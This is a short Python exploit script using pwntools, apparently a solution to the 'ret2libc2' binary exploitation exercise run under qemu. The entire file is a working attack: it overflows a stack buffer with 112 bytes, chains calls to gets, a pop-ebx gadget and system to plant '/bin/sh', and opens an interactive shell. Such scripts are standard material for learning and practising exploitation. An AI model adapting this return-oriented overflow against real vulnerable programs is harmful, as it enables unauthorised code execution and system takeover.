from pwn import*
context(os='linux', arch='i386', log_level='debug')
sh=process(["qemu-i386","-L","/usr/i686-linux-gnu/","./ret2libc2"])
buf2_addr = 0x804a080
gets_addr = 0x8048460
system_addr = 0x8048490
pop_ebx_addr = 0x0804843d
sh.sendline(flat('a'*112 ,p32(gets_addr) ,p32(pop_ebx_addr) , p32(buf2_addr) , p32(system_addr) , 'aaaa' , p32(buf2_addr)))
sh.sendline('/bin/sh')
sh.interactive()
